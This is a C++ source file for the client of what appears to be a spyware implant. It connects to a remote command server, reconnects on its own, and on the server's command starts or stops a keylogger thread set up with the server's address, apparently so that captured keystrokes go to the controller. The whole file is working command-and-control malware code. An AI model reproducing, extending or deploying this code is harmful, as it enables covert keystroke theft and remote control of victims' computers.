#include "client.hpp"

void* helper_thread(void* arg) {
    CLSpyTunnel* tunnel = static_cast<CLSpyTunnel*>(arg);
    tunnel->run();
}

Client::Client(const char* __ip, const int __port): port_(__port), socket_(-1) {
    for (int i=0; i<MAX_IP_LEN; i++) {
        ip_[i] = __ip[i];
        if (__ip[i] == '\0') {
            break;
        }
    }

    if (init() < 0) {
        return;
    }

    start();
}


int Client::init() {
    memset(&server_addr_, 0, sizeof(server_addr_));
    server_addr_.sin_family = AF_INET;
    server_addr_.sin_port = htons(port_);
    if (inet_pton(AF_INET, ip_, &server_addr_.sin_addr) <= 0) {
        printf("Invalid address or address not supported\n");
        return -1;
    }

    printf("Initializing successful\n");
    return 0;
}

void Client::start() {
    uint16_t command;
    char buffer[OUT_SIZE];
    int bytes_received = 0;
    int bytes_sent = 0;
    int error = 0;
    socklen_t len = sizeof(error);
    CommandCode command_code = 0;
    int command_arg = 0;

    while (!shutdown_flag_) {
        retry_flag_ = false;
        
        socket_ = socket(AF_INET, SOCK_STREAM, 0);
        if (socket_ < 0) {
            printf("Socket creation failed: %s\n", strerror(errno));
            goto retry;
        }

        if (connect(socket_, (struct sockaddr*)&server_addr_, sizeof(server_addr_)) < 0) {
            if (errno == ECONNREFUSED || errno == ETIMEDOUT) {
                printf("Trying to connect to the server\n");
                goto retry;
            } else {
                printf("Connection failed: %s\n", strerror(errno));
                return;
            }
        }
        
        if (getsockopt(socket_, SOL_SOCKET, SO_ERROR, &error, &len) < 0) {
            printf("Connection verification failed: %s\n", strerror(error));
            goto retry;
        }
        printf("Connected to server %s:%d\n", ip_, port_);
        while (!retry_flag_ && !shutdown_flag_) {
            bytes_received = recv(socket_, &command, sizeof(command), 0);
            if (bytes_received < 0) {
                printf("Error receiving data\n");
                break;
            } else if (bytes_received == 0) {
                printf("Server closed connection\n");
                break;
            }

            command_code = static_cast<CommandCode>(command >> 8);
            command_arg = static_cast<int>(command & 0x00FF);
            switch (command_code) {
                case TEST:
                    printf("Received TEST command\n");
                    retry_flag_ = send_out(socket_, EXEC_SUCCESS);
                    break;
                case KILL:
                    printf("Received KILL command\n");
                    retry_flag_ = send_out(socket_, EXEC_SUCCESS);
                    shutdown_flag_ = true;
                    break;
                case KEYLOGGER:
                    printf("Received KEYLOGGER command\n");
                    if (command_arg) {
                        // Start the keylogger
                        if (keylogger_ == nullptr) {
                            keylogger_ = new CLKeylogger();
                            // Start the keylogger in a seperate thread
                            keylogger_->init(ip_, port_, &shutdown_flag_);
                            pthread_t keylogger_thread;
                            if (pthread_create(&keylogger_thread, nullptr, helper_thread, keylogger_) != 0) {
                                printf("Error creating keylogger thread\n");
                                delete keylogger_;
                                keylogger_ = nullptr;
                                retry_flag_ = send_out(socket_, EXEC_ERROR);
                                break;
                            } else {
                                printf("Keylogger started\n");
                                retry_flag_ = send_out(socket_, EXEC_SUCCESS);
                                pthread_detach(keylogger_thread); // Detach the thread to avoid memory leaks
                            }
                        } else {
                            printf("Keylogger already running\n");
                            retry_flag_ = send_out(socket_, EXEC_ERROR);
                        }
                    } else {
                        // Stop the keylogger
                        if (keylogger_) {
                            keylogger_->shutdown();
                            delete keylogger_;
                            keylogger_ = nullptr;
                            retry_flag_ = send_out(socket_, EXEC_SUCCESS);
                        } else {
                            printf("Keylogger not running\n");
                            retry_flag_ = send_out(socket_, EXEC_ERROR);
                        }
                    }
                    break;
                default:
                    printf("Unknown command: %d\n", command_code);
                    retry_flag_ = send_out(socket_, EXEC_ERROR);
                    break;
            }
        }
        retry:
            if (!shutdown_flag_) {
                sleep(1);
                if (socket_ >= 0) {
                    close(socket_);
                }
                continue;
            }
    }
}

void Client::shutdown() {
    printf("Shutting down client\n");
    close(socket_);

    if (keylogger_) {
        keylogger_->shutdown();
        delete keylogger_;
        keylogger_ = nullptr;
    }
}